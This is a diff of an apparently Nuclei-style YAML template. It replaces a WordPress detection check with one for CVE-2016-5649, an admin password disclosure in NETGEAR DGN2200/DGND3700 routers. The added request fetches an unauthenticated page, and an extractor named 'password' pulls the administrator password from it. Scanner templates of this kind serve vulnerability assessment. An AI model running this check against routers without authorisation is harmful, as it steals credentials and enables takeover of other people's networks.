@@ -1,50 +1,37 @@
-id: wordpress-detect
+id: CVE-2016-5649
 info:
-    name: WordPress Detect
-    author: pdteam,daffainfo,ricardomaia,topscoder
-    severity: info
-    description: ""
+    name: NETGEAR DGN2200 / DGND3700 - Admin Password Disclosure
+    author: suman_kar
+    severity: critical
+    description: NETGEAR DGN2200 / DGND3700 is susceptible to a vulnerability within the page 'BSW_cxttongr.htm' which can allow a remote attacker to access this page without any authentication. The attacker can then use this password to gain administrator access of the targeted router's web interface.
     remediation: ""
-    reference: []
+    reference:
+        - https://nvd.nist.gov/vuln/detail/CVE-2016-5649
+        - https://packetstormsecurity.com/files/140342/Netgear-DGN2200-DGND3700-WNDR4500-Information-Disclosure.html
+        - http://packetstormsecurity.com/files/152675/Netgear-DGN2200-DGND3700-Admin-Password-Disclosure.html
     classification:
-        cvssmetrics: ""
-        cvssscore: 0
-        cveid: ""
-        cweid: ""
+        cvssmetrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+        cvssscore: 9.8
+        cveid: CVE-2016-5649
+        cweid: CWE-200
     metadata:
-        verified: true
-        shodanquery: http.component:"WordPress"
-    tags: tech,wordpress,cms,wp
-name: ""
+        verified: false
+        shodanquery: ""
+    tags: cve,cve2016,iot,netgear,router,packetstorm
 requests:
-    - raw: []
+    - raw:
+        - |
+          GET /BSW_cxttongr.htm HTTP/1.1
+          Host: {{Hostname}}
+          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
       cookiereuse: false
-      method: GET
-      path:
-        - '{{BaseURL}}'
-        - '{{BaseURL}}/wp-admin/install.php'
-        - '{{BaseURL}}/feed/'
-        - '{{BaseURL}}/?feed=rss2'
-      redirects: true
-      maxredirects: 2
-      stopatfirstmatch: true
+      method: ""
+      path: []
+      redirects: false
+      maxredirects: 0
+      stopatfirstmatch: false
       matcherscondition: and
       matchers:
-        - type: regex
-          part: ""
-          words: []
-          dsl: []
-          regex:
-            - <generator>https?:\/\/wordpress\.org.*</generator>
-            - wp-login.php
-            - \/wp-content/themes\/
-            - \/wp-includes\/
-            - name="generator" content="wordpress
-            - <link[^>]+s\d+\.wp\.com
-            - <!-- This site is optimized with the Yoast (?:WordPress )?SEO plugin v([\d.]+) -
-            - <!--[^>]+WP-Super-Cache
-          condition: or
-          status: []
         - type: status
           part: ""
           words: []
@@ -53,20 +40,18 @@ requests:
           condition: ""
           status:
             - 200
+        - type: word
+          part: body
+          words:
+            - '<title>Smart Wizard Result</title> '
+          dsl: []
+          regex: []
+          condition: ""
+          status: []
       extractors:
         - type: regex
-          name: version_by_generator
+          name: password
           group: 1
           regex:
-            - (?m)https:\/\/wordpress.org\/\?v=([0-9.]+)
-        - type: regex
-          name: version_by_js
-          group: 1
-          regex:
-            - wp-emoji-release\.min\.js\?ver=((\d+\.?)+)\b
-        - type: regex
-          name: version_by_css
-          group: 1
-          regex:
-            - install\.min\.css\?ver=((\d+\.?)+)\b
+            - <b>Success "([a-z]+)"
 workflows: []
